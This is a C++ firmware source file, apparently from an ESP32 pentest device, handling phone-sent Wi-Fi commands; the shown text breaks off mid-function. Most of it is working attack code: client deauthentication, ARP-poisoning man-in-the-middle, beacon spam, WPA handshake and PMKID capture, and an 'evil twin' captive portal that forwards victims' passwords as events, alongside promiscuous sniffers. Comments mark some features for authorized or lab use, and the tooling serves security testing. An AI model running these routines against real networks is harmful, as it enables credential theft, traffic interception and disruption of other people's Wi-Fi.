#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "internal.h"
#include "modules/wifi/deauther.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/netcut.h"
#include "modules/wifi/wifi_atks.h"
#include <esp_wifi.h>
#include <globals.h>

#include "core/wifi/wifi_mac.h"
#include "modules/pwnagotchi/pwnagotchi.h"
#include "modules/wifi/brucia_responder.h"
#include "modules/wifi/jam_detect.h"
#include "modules/wifi/karma_attack.h"

namespace brucia {
namespace companion {
// --- wifi.ap stream (wardriving) ---

const char *encToStr(wifi_auth_mode_t enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "open";
        case WIFI_AUTH_WEP: return "wep";
        case WIFI_AUTH_WPA_PSK: return "wpa";
        case WIFI_AUTH_WPA2_PSK: return "wpa2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "wpa/wpa2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "wpa2-ent";
        case WIFI_AUTH_WPA3_PSK: return "wpa3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "wpa2/wpa3";
        default: return "unknown";
    }
}

void sendWifiApEvent(const String &bssid, const String &ssid, int ch, int rssi, const char *enc) {
    JsonDocument out;
    beginEnvelope(out, MSG_EVENT, 0);
    JsonObject d = out["d"].to<JsonObject>();
    d["ev"] = "wifi.ap";
    JsonObject r = d["data"].to<JsonObject>();
    r["bssid"] = bssid;
    r["ssid"] = ssid;
    r["ch"] = ch;
    r["rssi"] = rssi;
    r["enc"] = enc;
    r["ts"] = (uint32_t)millis(); // device uptime; the app stamps real time + GPS
    sendEnvelope(out);
}

// --- wifi.sta stream: headless station/client sniffer (promiscuous, channel-hopping).
//     Reports devices (stations) and the BSSID they talk to; the phone lists/dedups them.
//     Mutually exclusive with the wifi.ap scan stream (both want the WiFi radio). ---
struct StaHit {
    uint8_t mac[6];
    uint8_t bssid[6];
    int8_t rssi;
};
static volatile bool staSniff = false;
static StaHit staRing[48];
static volatile uint8_t staHead = 0;
static volatile uint8_t staTail = 0;
static uint8_t staChannel = 1;
static uint32_t staLastHop = 0;

static void staSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!staSniff) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload; // 802.11 header: addr1@4, addr2@10, addr3@16
    uint8_t next = (uint8_t)((staHead + 1) % 48);
    if (next == staTail) return; // ring full, drop
    StaHit &h = staRing[staHead];
    memcpy(h.mac, p + 10, 6);   // addr2 = transmitter (station)
    memcpy(h.bssid, p + 16, 6); // addr3 = BSSID
    h.rssi = (int8_t)pkt->rx_ctrl.rssi;
    staHead = next;
}

void staStart() {
    if (staSniff) return;
    ensureWifiPlatform();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(staSnifferCb);
    staChannel = 1;
    esp_wifi_set_channel(staChannel, WIFI_SECOND_CHAN_NONE);
    staHead = 0;
    staTail = 0;
    staLastHop = millis();
    staSniff = true;
}

void staStop() {
    if (!staSniff) return;
    staSniff = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
}

void staService() {
    if (!staSniff) return;
    if (millis() - staLastHop > 280) { // hop 2.4GHz channels so we see the whole band
        staChannel = (uint8_t)((staChannel % 13) + 1);
        esp_wifi_set_channel(staChannel, WIFI_SECOND_CHAN_NONE);
        staLastHop = millis();
    }
    int n = 0;
    while (staTail != staHead && n < 20) {
        StaHit h = staRing[staTail];
        staTail = (uint8_t)((staTail + 1) % 48);
        n++;
        char mac[18], bssid[18];
        snprintf(
            mac,
            sizeof(mac),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            h.mac[0],
            h.mac[1],
            h.mac[2],
            h.mac[3],
            h.mac[4],
            h.mac[5]
        );
        snprintf(
            bssid,
            sizeof(bssid),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            h.bssid[0],
            h.bssid[1],
            h.bssid[2],
            h.bssid[3],
            h.bssid[4],
            h.bssid[5]
        );
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "wifi.sta";
        JsonObject data = d["data"].to<JsonObject>();
        data["mac"] = mac;
        data["bssid"] = bssid;
        data["rssi"] = h.rssi;
        data["ch"] = staChannel;
        sendEnvelope(out);
    }
}

// --- wifi.probe stream: headless 802.11 PROBE REQUEST profiler (promiscuous, channel-hopping).
//     Parses management frames of type 0 / subtype 4 to extract the client MAC (addr2) and the
//     requested SSID (from the SSID information element at the start of the frame body), plus RSSI.
//     Streams EVENT ev="wifi.probe" data { mac, ssid, rssi, ch }. Built on the same promiscuous +
//     channel-hop scaffolding as the wifi.sta sniffer above (staStart/staSnifferCb). Shares the
//     Wi-Fi radio, so it is mutually exclusive with wifi.ap and wifi.sta. ---
struct ProbeHit {
    uint8_t mac[6];
    char ssid[33]; // max SSID is 32 bytes + NUL
    int8_t rssi;
};
static volatile bool probeSniff = false;
static ProbeHit probeRing[32];
static volatile uint8_t probeHead = 0;
static volatile uint8_t probeTail = 0;
static uint8_t probeChannel = 1;
static uint32_t probeLastHop = 0;

static void probeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!probeSniff) return;
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload;
    // 802.11 frame control byte 0: bits 2-3 = type, bits 4-7 = subtype. Probe request = type 0
    // (management), subtype 4.
    uint8_t fc = p[0];
    if (((fc >> 2) & 0x03) != 0x00 || ((fc >> 4) & 0x0F) != 0x04) return;
    uint8_t next = (uint8_t)((probeHead + 1) % 32);
    if (next == probeTail) return; // ring full, drop
    ProbeHit &h = probeRing[probeHead];
    memcpy(h.mac, p + 10, 6); // addr2 = transmitter (the probing client)
    h.rssi = (int8_t)pkt->rx_ctrl.rssi;
    // Frame body starts at offset 24 (no QoS/HT-control in a probe request). The first tagged
    // parameter is the SSID IE: [tag id = 0][length][SSID bytes]. An empty length = wildcard probe.
    h.ssid[0] = '\0';
    const int body = 24;
    if (pkt->rx_ctrl.sig_len >= body + 2 && p[body] == 0x00) {
        uint8_t len = p[body + 1];
        if (len > 32) len = 32;
        if (len > 0 && pkt->rx_ctrl.sig_len >= body + 2 + len) {
            memcpy(h.ssid, p + body + 2, len);
            h.ssid[len] = '\0';
        }
    }
    probeHead = next;
}

void probeStart() {
    if (probeSniff) return;
    ensureWifiPlatform();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT; // only management frames (probe requests)
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(probeSnifferCb);
    probeChannel = 1;
    esp_wifi_set_channel(probeChannel, WIFI_SECOND_CHAN_NONE);
    probeHead = 0;
    probeTail = 0;
    probeLastHop = millis();
    probeSniff = true;
}

void probeStop() {
    if (!probeSniff) return;
    probeSniff = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
}

void probeService() {
    if (!probeSniff) return;
    if (millis() - probeLastHop > 280) { // hop 2.4GHz channels so we see probes on the whole band
        probeChannel = (uint8_t)((probeChannel % 13) + 1);
        esp_wifi_set_channel(probeChannel, WIFI_SECOND_CHAN_NONE);
        probeLastHop = millis();
    }
    int n = 0;
    while (probeTail != probeHead && n < 20) {
        ProbeHit h = probeRing[probeTail];
        probeTail = (uint8_t)((probeTail + 1) % 32);
        n++;
        char mac[18];
        snprintf(
            mac,
            sizeof(mac),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            h.mac[0],
            h.mac[1],
            h.mac[2],
            h.mac[3],
            h.mac[4],
            h.mac[5]
        );
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "wifi.probe";
        JsonObject data = d["data"].to<JsonObject>();
        data["mac"] = mac;
        data["ssid"] = h.ssid; // empty string = wildcard / broadcast probe
        data["rssi"] = h.rssi;
        data["ch"] = probeChannel;
        sendEnvelope(out);
    }
}

// --- wifi.monitor stream: full 802.11 monitor-mode (promiscuous) capture. Streams every
//     captured frame to the phone as base64 so it can assemble a PCAP (whole-network
//     over-the-air capture a phone cannot do on its own). Built on the same promiscuous
//     scaffolding as the wifi.sta sniffer (esp_wifi promiscuous + ISR-safe ring buffer),
//     but keeps the RAW bytes of each frame instead of parsed fields.
//
//     SUB { stream:"wifi.monitor", on, [channel], [bssid] }:
//       - channel given  -> LOCK to it (no hop): the "watch my own AP" case.
//       - channel absent -> slow-hop 2.4 GHz to see the whole band.
//       - bssid given    -> only frames to/from that BSSID (addr1/addr2/addr3) are kept.
//     EVENT ev="wifi.monitor" data { ts:<micros>, ch:<n>, rssi:<dBm>, len:<n>, data:"<b64>" }.
//     Shares the Wi-Fi radio -> mutually exclusive with wifi.ap / wifi.sta / wifi.probe. ---
#define MON_MAX_FRAME 512 // cap captured bytes per frame (first 512) to keep the USB stream up
#define MON_RING 12       // ring depth; drop on overflow (each slot holds up to MON_MAX_FRAME)
struct MonHit {
    uint32_t ts;
    int8_t rssi;
    uint8_t ch;
    uint16_t len;
    uint8_t data[MON_MAX_FRAME];
};
static volatile bool monSniff = false;
static MonHit monRing[MON_RING];
static volatile uint8_t monHead = 0;
static volatile uint8_t monTail = 0;
static uint8_t monChannel = 1;
static bool monLockChannel = false; // true = stay on monChannel (no hop)
static uint32_t monLastHop = 0;
static bool monBssidFilter = false;
static uint8_t monBssid[6] = {0};

static void monSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!monSniff) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 10) return;
    const uint8_t *p = pkt->payload;
    uint16_t sig = pkt->rx_ctrl.sig_len;
    // Optional BSSID filter: keep only frames where addr1/addr2/addr3 matches (needs a full
    // MAC-addressed header; control frames shorter than 24 bytes are dropped when filtering).
    if (monBssidFilter) {
        if (sig < 24) return;
        if (memcmp(p + 4, monBssid, 6) != 0 && memcmp(p + 10, monBssid, 6) != 0 &&
            memcmp(p + 16, monBssid, 6) != 0)
            return;
    }
    uint8_t next = (uint8_t)((monHead + 1) % MON_RING);
    if (next == monTail) return; // ring full, drop
    MonHit &h = monRing[monHead];
    uint16_t len = sig > MON_MAX_FRAME ? MON_MAX_FRAME : sig; // cap frame size
    memcpy(h.data, p, len);
    h.len = len;
    h.ts = micros();
    h.rssi = (int8_t)pkt->rx_ctrl.rssi;
    h.ch = monChannel;
    monHead = next;
}

void monStart(int channel, const char *bssidStr) {
    if (monSniff) return;
    ensureWifiPlatform();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {};
    // Capture everything over the air: management, data and control frames.
    filt.filter_mask =
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(monSnifferCb);
    // Optional BSSID filter.
    monBssidFilter = false;
    if (bssidStr && bssidStr[0]) {
        String b(bssidStr);
        b.replace(":", "");
        b.trim();
        if (b.length() == 12) {
            for (int i = 0; i < 6; i++)
                monBssid[i] = (uint8_t)strtoul(b.substring(i * 2, i * 2 + 2).c_str(), nullptr, 16);
            monBssidFilter = true;
        }
    }
    // Channel: lock to the requested one, or start a slow hop from channel 1.
    if (channel >= 1 && channel <= 14) {
        monChannel = (uint8_t)channel;
        monLockChannel = true;
    } else {
        monChannel = 1;
        monLockChannel = false;
    }
    esp_wifi_set_channel(monChannel, WIFI_SECOND_CHAN_NONE);
    monHead = 0;
    monTail = 0;
    monLastHop = millis();
    monSniff = true;
}

void monStop() {
    if (!monSniff) return;
    monSniff = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    monBssidFilter = false;
}

void monService() {
    if (!monSniff) return;
    // Slow-hop the 2.4 GHz band unless locked to a channel (the "watch my AP" case).
    if (!monLockChannel && millis() - monLastHop > 400) {
        monChannel = (uint8_t)((monChannel % 13) + 1);
        esp_wifi_set_channel(monChannel, WIFI_SECOND_CHAN_NONE);
        monLastHop = millis();
    }
    // Drain a bounded number of frames per service call so the USB stream keeps up.
    int n = 0;
    while (monTail != monHead && n < 6) {
        const MonHit &h = monRing[monTail];
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "wifi.monitor";
        JsonObject data = d["data"].to<JsonObject>();
        data["ts"] = h.ts;
        data["ch"] = h.ch;
        data["rssi"] = h.rssi;
        data["len"] = h.len;
        data["data"] = b64encode(h.data, h.len);
        sendEnvelope(out);
        monTail = (uint8_t)((monTail + 1) % MON_RING);
        n++;
    }
}

// Brucia: parse "<bssid> <channel> <seconds>" and run a time-bounded deauth of the
// target AP, then ACK. BSSID accepts AA:BB:.. or AABB.. ; duration is capped.
static void runWifiDeauth(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    int s2 = s1 >= 0 ? args.indexOf(' ', s1 + 1) : -1;
    if (s1 < 0 || s2 < 0) {
        sendErr(id, 400, "usage: wifi_deauth <bssid> <channel> <seconds>");
        return;
    }
    String bssid = args.substring(0, s1);
    int channel = args.substring(s1 + 1, s2).toInt();
    int seconds = args.substring(s2 + 1).toInt();
    bssid.replace(":", "");
    bssid.trim();
    if (bssid.length() != 12) {
        sendErr(id, 400, "bad bssid");
        return;
    }
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)strtoul(bssid.substring(i * 2, i * 2 + 2).c_str(), nullptr, 16);
    }
    if (channel < 1 || channel > 14) channel = 1;
    if (seconds < 1) seconds = 8;
    if (seconds > 60) seconds = 60; // cap
    runDeauthBounded(mac, channel, (uint32_t)seconds * 1000);
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = true;
    d["out"] = "deauth " + bssid + " ch" + String(channel) + " " + String(seconds) + "s done";
    sendEnvelope(o);
}

// Brucia: phone-driven, time-bounded ARP MITM. Connects the ESP to the given Wi-Fi (STA),
// then poisons the target <-> gateway ARP caches so their traffic routes through this device
// (transparent MITM redirect; the phone can proxy it). Reuses NetCut's ARP injection via
// runArpSpoofBounded(). AUTHORIZED / LAB USE ONLY.
//   arp_spoof <ssid> <pass> <target_ip> <gateway_ip> <secs>
// SSID and password must be single space-free tokens.
static void runArpSpoof(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    int s2 = s1 >= 0 ? args.indexOf(' ', s1 + 1) : -1;
    int s3 = s2 >= 0 ? args.indexOf(' ', s2 + 1) : -1;
    int s4 = s3 >= 0 ? args.indexOf(' ', s3 + 1) : -1;
    if (s1 < 0 || s2 < 0 || s3 < 0 || s4 < 0) {
        sendErr(id, 400, "usage: arp_spoof <ssid> <pass> <target_ip> <gateway_ip> <secs>");
        return;
    }
    String ssid = args.substring(0, s1);
    String pass = args.substring(s1 + 1, s2);
    String targetIp = args.substring(s2 + 1, s3);
    String gatewayIp = args.substring(s3 + 1, s4);
    int secs = args.substring(s4 + 1).toInt();
    if (secs < 1) secs = 30;
    if (secs > 300) secs = 300; // cap

    // Join the target Wi-Fi (STA) headlessly, bounded wait with ESC abort.
    ensureWifiPlatform();
    WiFi.mode(WIFI_MODE_STA);
    WiFi.begin(ssid.c_str(), pass.c_str());
    uint32_t start = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) {
        if (check(EscPress)) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED) {
        WiFi.disconnect(false, true);
        sendErr(id, 504, ("wifi connect failed: " + ssid).c_str());
        return;
    }

    String out;
    bool ok = runArpSpoofBounded(targetIp, gatewayIp, (uint32_t)secs * 1000, out, companionPollStop);
    WiFi.disconnect(false, true);

    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = ok;
    d["out"] = out;
    sendEnvelope(o);
}

// Brucia: phone-driven, time-bounded Wi-Fi beacon spam. The PHONE supplies the list of
// SSIDs to broadcast; the device TXes them as beacon frames for the requested duration.
// AUTHORIZED / LAB USE ONLY. Guarded by !LITE_VERSION (the beacon-spam helper, like the
// handshake capture, is only built in a full firmware).
//   wifi_beacon_spam <secs> <ssid1\nssid2...>   (list may also be comma-separated)
#if !defined(LITE_VERSION)
static void runWifiBeaconSpam(const String &argsIn, uint32_t id) {
    String args = argsIn;
    while (args.length() && args[0] == ' ') args.remove(0, 1); // strip leading spaces (keep newlines)
    // First whitespace/separator-delimited token is the duration in seconds.
    int sp = -1;
    for (int i = 0; i < (int)args.length(); i++) {
        char c = args[i];
        if (c == ' ' || c == '\n' || c == '\r' || c == ',') {
            sp = i;
            break;
        }
    }
    if (sp < 0) {
        sendErr(id, 400, "usage: wifi_beacon_spam <secs> <ssid1\\nssid2...>");
        return;
    }
    int secs = args.substring(0, sp).toInt();
    if (secs < 1) secs = 1;
    if (secs > 120) secs = 120; // clamp 1..120
    String list = args.substring(sp + 1);
    // Normalize separators: accept comma OR newline; beaconSpamList() splits on '\n'.
    list.replace("\r\n", "\n");
    list.replace("\r", "\n");
    list.replace(",", "\n");
    list.trim();
    if (list.length() == 0) {
        sendErr(id, 400, "no SSIDs provided");
        return;
    }
    if (list.length() > 9000) list = list.substring(0, 9000); // cap the list size sensibly (fits ~256 SSIDs)
    if (list[list.length() - 1] != '\n') list += "\n";        // ensure the final SSID is emitted
    int count = 0;
    for (int i = 0; i < (int)list.length(); i++)
        if (list[i] == '\n') count++;
    bool ok = beaconSpamListBounded(list.c_str(), (uint32_t)secs * 1000);
    String out = ok ? ("beacon spam done (" + String(secs) + "s, " + String(count) + " ssids)")
                    : "beacon spam failed (wifi init)";
    companionAckMsg(id, ok, out.c_str());
}
#endif

// --- Evil Portal (captive-portal / "evil twin"), phone-driven background session ------------------
// The device runs the fake AP + DNS + captive web server; the phone starts/stops it, optionally with
// a custom HTML template it pushed via fs_write, and receives each captured credential as an EVENT.
#if !defined(LITE_VERSION)
static EvilPortal *g_evilPortal = nullptr;
static String g_evilLastCred = "";

void evilPortalStop(uint32_t id, bool ack) {
    if (g_evilPortal) {
        delete g_evilPortal; // destructor tears down web server + DNS and restores WiFi mode
        g_evilPortal = nullptr;
    }
    g_evilLastCred = "";
    if (ack) companionAckMsg(id, true, "evil portal stopped");
}

// evil_portal_start <ssid>\t<templatePath>\t<channel>\t<deauth>  (tab-separated; trailing fields
// optional: templatePath may be empty, channel defaults to 1, deauth "1" enables client deauth so
// victims are knocked off their real AP and pushed onto this fake one - the targeted "evil twin").
static void evilPortalStart(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    // Split up to 4 tab-separated fields.
    String f[4] = {"", "", "", ""};
    int fi = 0, start = 0;
    for (int i = 0; i <= args.length() && fi < 4; i++) {
        if (i == args.length() || args[i] == '\t') {
            f[fi++] = args.substring(start, i);
            start = i + 1;
        }
    }
    String ssid = f[0];
    String templatePath = f[1];
    ssid.trim();
    templatePath.trim();
    uint8_t channel = (uint8_t)f[2].toInt();
    if (channel < 1 || channel > 14) channel = 1;
    bool deauth = (f[3].toInt() != 0);
    if (ssid.isEmpty()) ssid = "Free Wifi";
    if (g_evilPortal) evilPortalStop(0, false);
    // autoMode=true so setup() loads the page non-interactively (templatePath, else a default by
    // name) instead of popping a blocking on-device Default/Custom/Main menu that would hang the
    // companion loop waiting for a button press on the device.
    g_evilPortal = new EvilPortal(
        ssid, channel, deauth, false, /*autoMode=*/true, /*backgroundMode=*/true, templatePath
    );
    if (!g_evilPortal->setup()) {
        delete g_evilPortal;
        g_evilPortal = nullptr;
        companionAckMsg(id, false, "evil portal setup failed");
        return;
    }
    g_evilPortal->beginAP();
    String ip = WiFi.softAPIP().toString();
    char buf[96];
    snprintf(buf, sizeof(buf), "AP '%s' up at %s", g_evilPortal->getApName().c_str(), ip.c_str());
    companionAckMsg(id, true, buf);
}

static void evilPortalStatus(uint32_t id) {
    if (!g_evilPortal) {
        companionAckMsg(id, false, "not running");
        return;
    }
    String ip = WiFi.softAPIP().toString();
    char buf[128];
    snprintf(
        buf,
        sizeof(buf),
        "running ap='%s' ip=%s creds=%d",
        g_evilPortal->getApName().c_str(),
        ip.c_str(),
        g_evilPortal->hasCredentials() ? 1 : 0
    );
    companionAckMsg(id, true, buf);
}

// Pump the portal each loop iteration and stream a newly captured credential as EVENT evil.cred.
void evilPortalService() {
    if (!g_evilPortal) return;
    g_evilPortal->processRequests();
    if (g_evilPortal->hasCredentials()) {
        String pass = g_evilPortal->getCapturedPassword();
        if (pass != g_evilLastCred) {
            g_evilLastCred = pass;
            JsonDocument out;
            beginEnvelope(out, MSG_EVENT, 0);
            JsonObject d = out["d"].to<JsonObject>();
            d["ev"] = "evil.cred";
            JsonObject r = d["data"].to<JsonObject>();
            r["ap"] = g_evilPortal->getCapturedSSID(); // portal AP name
            r["pass"] = pass;                          // credential the victim submitted
            sendEnvelope(out);
        }
    }
}
#endif // !LITE_VERSION

bool dispatchWifiCommand(const CommandRequest &request) {
    const String &cmdStr = request.command;
    const uint32_t id = request.id;
    const bool helloSeen = request.session.helloSeen;
    const bool subWifiAp = request.session.subWifiAp;
    const bool subBleOn = request.session.subBleOn;
    const bool subGhzOn = request.session.subGhzOn;
    do {

        // Brucia: phone-driven, time-bounded Wi-Fi deauth of a target AP.
        //   wifi_deauth <bssid> <channel> <seconds>
        if (cmdStr.startsWith("wifi_deauth ")) {
            runWifiDeauth(cmdStr.substring(12), id);
            break;
        }

        // Brucia: phone-driven, time-bounded ARP MITM. The ESP joins the given
        // Wi-Fi (STA) then ARP-poisons the target <-> gateway so their traffic
        // routes through the device (transparent MITM redirect). Reuses NetCut's
        // ARP injection via runArpSpoofBounded(). AUTHORIZED / LAB USE ONLY.
        //   arp_spoof <ssid> <pass> <target_ip> <gateway_ip> <secs>
        if (cmdStr.startsWith("arp_spoof ")) {
            runArpSpoof(cmdStr.substring(10), id);
            break;
        }

        // Brucia: phone-driven handshake capture.
        //   wifi_handshake <bssid> <channel> <seconds> <ssid...>
        if (cmdStr.startsWith("wifi_handshake ")) {
            String a = cmdStr.substring(15);
            a.trim();
            int s1 = a.indexOf(' '), s2 = a.indexOf(' ', s1 + 1), s3 = a.indexOf(' ', s2 + 1);
            if (s1 < 0 || s2 < 0) {
                sendErr(id, 400, "usage: wifi_handshake <bssid> <channel> <seconds> [ssid]");
            } else {
                String bssid = a.substring(0, s1);
                int channel = a.substring(s1 + 1, s2).toInt();
                int secs = (s3 > 0 ? a.substring(s2 + 1, s3) : a.substring(s2 + 1)).toInt();
                String ssid = s3 > 0 ? a.substring(s3 + 1) : "";
                if (channel < 1 || channel > 14) channel = 1;
                if (secs < 5) secs = 30;
                if (secs > 120) secs = 120;
#if !defined(LITE_VERSION)
                bool ok = capture_handshake_bounded(ssid, bssid, (uint8_t)channel, (uint32_t)secs);
                JsonDocument o;
                beginEnvelope(o, MSG_ACK, id);
                JsonObject d = o["d"].to<JsonObject>();
                d["ok"] = ok;
                d["out"] = ok ? "handshake captured in /BrucePCAP/handshakes/"
                              : "no handshake (try again, closer, more time)";
                sendEnvelope(o);
#else
                sendErr(id, 501, "wifi_handshake not available in this (lite) build");
#endif
            }
            break;
        }

        // Brucia: phone-driven, clientless PMKID capture.
        //   wifi_pmkid <bssid> <channel> <seconds>
        if (cmdStr.startsWith("wifi_pmkid ")) {
            String a = cmdStr.substring(11);
            a.trim();
            int s1 = a.indexOf(' ');
            int s2 = s1 >= 0 ? a.indexOf(' ', s1 + 1) : -1;
            if (s1 < 0 || s2 < 0) {
                sendErr(id, 400, "usage: wifi_pmkid <bssid> <channel> <seconds>");
            } else {
                String bssid = a.substring(0, s1);
                int channel = a.substring(s1 + 1, s2).toInt();
                int secs = a.substring(s2 + 1).toInt();
                bssid.replace(":", "");
                bssid.trim();
                if (bssid.length() != 12) {
                    sendErr(id, 400, "bad bssid");
                    break;
                }
                String mac = "";
                for (int i = 0; i < 6; i++) {
                    if (i) mac += ":";
                    mac += bssid.substring(i * 2, i * 2 + 2);
                }
                if (channel < 1 || channel > 14) channel = 1;
                if (secs < 5) secs = 5;
                if (secs > 120) secs = 120;
#if !defined(LITE_VERSION)
                String outPath;
                bool ok = capture_pmkid_bounded(mac, (uint8_t)channel, (uint32_t)secs, outPath);
                JsonDocument o;
                beginEnvelope(o, MSG_ACK, id);
                JsonObject d = o["d"].to<JsonObject>();
                d["ok"] = ok;
                d["out"] = ok ? ("pmkid/eapol pcap written to " + outPath)
                              : "no PMKID/EAPOL seen (no clients? try again, closer, more time)";
                sendEnvelope(o);
#else
                sendErr(id, 501, "wifi_pmkid not available in this (lite) build");
#endif
            }
            break;
        }

        // Brucia: phone-driven, time-bounded Wi-Fi beacon spam. The phone
        // supplies the SSID list. AUTHORIZED / LAB USE ONLY.
        //   wifi_beacon_spam <secs> <ssid1\nssid2...>
        if (cmdStr.startsWith("wifi_beacon_spam ")) {
#if !defined(LITE_VERSION)
            runWifiBeaconSpam(cmdStr.substring(17), id);
#else
            sendErr(id, 501, "wifi_beacon_spam not available in this (lite) build");
#endif
            break;
        }

        // Brucia: phone-driven Evil Portal (captive-portal / evil twin). The device
        // runs the fake AP + DNS + web server; captured creds stream as EVENT evil.cred.
        if (cmdStr.startsWith("evil_portal_start")) {
#if !defined(LITE_VERSION)
            // args after the command token (may be empty -> default SSID)
            String a = cmdStr.length() > 18 ? cmdStr.substring(18) : "";
            evilPortalStart(a, id);
#else
            sendErr(id, 501, "evil_portal not available in this (lite) build");
#endif
            break;
        }

        if (cmdStr == "evil_portal_stop") {
#if !defined(LITE_VERSION)
            evilPortalStop(id, true);
#else
            sendErr(id, 501, "evil_portal not available in this (lite) build");
#endif
            break;
        }

        if (cmdStr == "evil_portal_status") {
#if !defined(LITE_VERSION)
            evilPortalStatus(id);
#else
            sendErr(id, 501, "evil_portal not available in this (lite) build");
#endif
            break;
        }

        // Brucia Wi-Fi: headless, time-bounded deauth-flood ("jamming") detector.
        // Hops channels 1-11 and reports deauth vs total frame counts.
        // Caps: wifi.   jam_detect <secs>
        // Wi-Fi station join parity (Bruce "Connect to Wifi"):
        //   wifi_connect <ssid>\x1f<pass> -> join an AP (0x1F separates ssid/pass so
        //                                    both may contain spaces); ACK the IP
        //   wifi_disconnect               -> drop the station link
        //   wifi_status                   -> connected <ssid> <ip> | disconnected
        if (cmdStr.startsWith("wifi_connect ")) {
            String rest = cmdStr.substring(13);
            int sep = rest.indexOf('\x1f');
            String ssid = sep >= 0 ? rest.substring(0, sep) : rest;
            String pass = sep >= 0 ? rest.substring(sep + 1) : "";
            ssid.trim();
            if (ssid.length() == 0) {
                sendErr(id, 400, "usage: wifi_connect <ssid>\\x1f<pass>");
                break;
            }
            bool ok = _connectToWifiNetwork(ssid, pass);
            if (ok) {
                companionAckMsg(id, true, WiFi.localIP().toString().c_str());
            } else {
                companionAckMsg(id, false, "connect failed");
            }
            break;
        }

        if (cmdStr.startsWith("wifi_disconnect")) {
            wifiDisconnect();
            companionAckMsg(id, true, "disconnected");
            break;
        }

        if (cmdStr.startsWith("wifi_status")) {
            String out = WiFi.isConnected() ? ("connected " + WiFi.SSID() + " " + WiFi.localIP().toString())
                                            : String("disconnected");
            companionAckMsg(id, true, out.c_str());
            break;
        }

        // Wi-Fi MAC parity (Bruce "Change MAC"):
        //   wifi_get_mac            -> ACK current STA MAC
        //   wifi_set_mac <mac|random> -> set + persist the STA MAC
        if (cmdStr.startsWith("wifi_get_mac")) {
            companionAckMsg(id, true, WiFi.macAddress().c_str());
            break;
        }

        if (cmdStr.startsWith("wifi_set_mac ")) {
            String arg = cmdStr.substring(13);
            arg.trim();
            String mac = arg.equalsIgnoreCase("random") ? generateRandomMAC() : arg;
            if (!validateMACFormat(mac)) {
                sendErr(id, 400, "usage: wifi_set_mac <aa:bb:cc:dd:ee:ff|random>");
                break;
            }
            uint8_t m[6];
            sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
            // esp_wifi_set_mac needs the Wi-Fi driver started and the STA idle.
            WiFi.mode(WIFI_STA);
            WiFi.disconnect(false);
            esp_err_t r = esp_wifi_set_mac(WIFI_IF_STA, m);
            if (r == ESP_OK) {
                bruceConfig.wifiMAC = mac;
                bruceConfig.saveFile();
                companionAckMsg(id, true, mac.c_str());
            } else {
